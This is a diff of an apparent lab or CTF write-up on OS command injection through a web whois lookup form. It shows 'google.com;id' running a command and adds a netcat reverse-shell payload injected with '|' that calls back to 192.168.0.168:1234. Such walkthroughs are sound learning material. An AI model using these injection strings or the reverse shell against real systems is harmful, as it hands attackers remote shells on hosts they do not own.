@@ -21,7 +21,7 @@ Lets provide a domain name say ```google.com```
 
 So we got the whois look up results for the domain name ```google.com```
 
-The ```semicolon(;)``` is often used as a delimeter so seperate multiple commands within a single input field. So, we can try to use the ```semicolon(;)``` character to run multiple commands.
+The ```semicolon(;)``` is often used as a delimiter so seperate multiple commands within a single input field. So, we can try to use the ```semicolon(;)``` character to run multiple commands.
 
 For example lets say we want to run the ```id``` command alongside the domain name we provided. So, we'll be having an input like this ```google.com;id```
 
@@ -36,8 +36,17 @@ Scrolling down,
 
 It worked hehe, we were able to successfully execute the linux command
 
+Other delimiter characters like ```|``` and ```||``` also works
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a25768ec-3be8-489a-9333-e3c310810ef2)
 
+Lets get a reverse shell from this
+
+payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```
+
+Ensure you set up a netcat listener
+
+So, our input would look like this ```google.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.168 1234 >/tmp/f```
 
 
 
